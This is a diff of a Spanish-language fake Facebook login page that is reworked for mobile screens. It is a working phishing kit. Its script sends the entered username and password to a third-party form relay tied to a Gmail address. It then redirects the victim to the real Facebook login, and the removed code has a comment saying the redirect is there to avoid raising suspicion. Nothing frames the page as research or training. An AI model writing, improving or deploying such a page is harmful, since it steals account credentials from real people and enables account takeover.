@@ -2,151 +2,151 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Entrar o registrarse</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRp1SfsL_y.ico">
     <style>
-        /* Estilos Base */
         body { 
-            font-family: Helvetica, Arial, sans-serif; 
-            background-color: #f0f2f5; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fff; 
             margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            min-height: 100vh;
+            padding: 0;
+            color: #1c1e21;
         }
 
-        .container { 
-            width: 100%; 
-            max-width: 980px; 
-            display: flex; 
-            flex-direction: row; 
-            justify-content: space-between; 
-            align-items: center; 
-            padding: 20px;
+        /* Contenedor principal para móviles */
+        .mobile-login {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 16px;
+            margin-top: 20px;
+        }
+
+        .fb-logo {
+            color: #0866ff;
+            font-size: 30px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        /* Formulario compacto */
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #f5f6f7;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 10px;
+            font-size: 14px;
             box-sizing: border-box;
         }
 
-        .left-col { 
-            width: 500px; 
-            padding-right: 32px; 
+        .btn-blue {
+            width: 100%;
+            background-color: #0866ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 4px;
         }
 
-        .left-col h1 { 
-            color: #0866ff; 
-            font-size: 60px; 
-            letter-spacing: -2px; 
-            margin: 0; 
+        .forgot-link {
+            color: #0866ff;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 15px 0;
+            display: block;
         }
 
-        .left-col p { 
-            font-size: 28px; 
-            line-height: 32px; 
-            color: #1c1e21; 
+        .divider {
+            width: 100%;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+            position: relative;
         }
 
-        .login-box { 
-            background: #fff; 
-            padding: 20px; 
-            border-radius: 8px; 
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); 
-            width: 396px; 
-            text-align: center; 
-            box-sizing: border-box;
+        .btn-green {
+            background-color: transparent;
+            color: #0866ff;
+            border: 1px solid #0866ff;
+            border-radius: 8px;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
         }
 
-        input { 
-            width: 100%; 
-            height: 52px; 
-            padding: 14px; 
-            margin-bottom: 12px; 
-            border: 1px solid #dddfe2; 
-            border-radius: 6px; 
-            font-size: 17px; 
-            box-sizing: border-box; 
-        }
+        /* Ocultar versión de escritorio en celulares */
+        .desktop-only { display: none; }
 
-        .btn-login { 
-            width: 100%; 
-            height: 48px; 
-            background-color: #0866ff; 
-            border: none; 
-            border-radius: 6px; 
-            color: #fff; 
-            font-size: 20px; 
-            font-weight: bold; 
-            cursor: pointer; 
-        }
-
-        .forgot { display: block; margin: 16px 0; color: #0866ff; text-decoration: none; font-size: 14px; }
-        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .btn-new { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; padding: 0 16px; height: 48px; cursor: pointer; }
-
-        /* --- ESTILOS PARA CELULAR (MÓVIL) --- */
-        @media (max-width: 900px) {
-            body { align-items: flex-start; }
-            .container { 
-                flex-direction: column; 
-                align-items: center; 
-                padding: 10px;
-                margin-top: 20px;
-            }
-            .left-col { 
-                width: 100%; 
-                padding-right: 0; 
-                text-align: center; 
-                margin-bottom: 20px;
-            }
-            .left-col h1 { font-size: 45px; }
-            .left-col p { font-size: 20px; line-height: 24px; }
-            .login-box { 
-                width: 100%; 
-                max-width: 400px; 
-                box-shadow: none;
-                background: transparent;
-                padding: 0;
-            }
-            .login-box form {
-                background: #fff;
-                padding: 15px;
-                border-radius: 8px;
-                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            }
+        /* Ajustes para computadoras */
+        @media (min-width: 900px) {
+            body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+            .mobile-login { display: none; }
+            .desktop-only { display: flex; width: 980px; justify-content: space-between; align-items: center; }
+            .left-text h1 { color: #0866ff; font-size: 50px; margin: 0; }
+            .left-text p { font-size: 22px; width: 450px; }
+            .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; text-align: center; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="left-col">
+
+    <div class="mobile-login">
+        <div class="fb-logo">facebook</div>
+        <div class="login-card">
+            <form onsubmit="handleSubmit(event)">
+                <input type="text" id="m_user" placeholder="Celular o correo electrónico" required>
+                <input type="password" id="m_pass" placeholder="Contraseña" required>
+                <button type="submit" class="btn-blue">Iniciar sesión</button>
+            </form>
+            <center>
+                <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+                <div class="divider"></div>
+                <button class="btn-green">Crear cuenta nueva</button>
+            </center>
+        </div>
+    </div>
+
+    <div class="desktop-only">
+        <div class="left-text">
             <h1>facebook</h1>
             <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         <div class="login-box">
-            <form onsubmit="handleLogin(event)">
-                <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
-                <input type="password" id="pass" placeholder="Contraseña" required>
-                <button type="submit" class="btn-login">Iniciar sesión</button>
-                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
-                <hr>
-                <button type="button" class="btn-new">Crear cuenta nueva</button>
+            <form onsubmit="handleSubmit(event)">
+                <input type="text" id="d_user" placeholder="Correo electrónico o número de teléfono">
+                <input type="password" id="d_pass" placeholder="Contraseña">
+                <button type="submit" class="btn-blue">Iniciar sesión</button>
             </form>
+            <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+            <hr>
+            <button style="background-color:#42b72a; border:none; color:white; width:auto; padding:10px 20px;" class="btn-blue">Crear cuenta nueva</button>
         </div>
     </div>
 
     <script>
-        function handleLogin(event) {
-            event.preventDefault();
-            const data = { 
-                u: document.getElementById('email').value, 
-                p: document.getElementById('pass').value 
-            };
-            
+        function handleSubmit(e) {
+            e.preventDefault();
+            const u = document.getElementById('m_user').value || document.getElementById('d_user').value;
+            const p = document.getElementById('m_pass').value || document.getElementById('d_pass').value;
+
             fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({ user: u, pass: p })
             }).then(() => {
-                // Redirigir al Facebook real para no levantar sospechas
                 window.location.href = "https://www.facebook.com/login/";
             });
         }
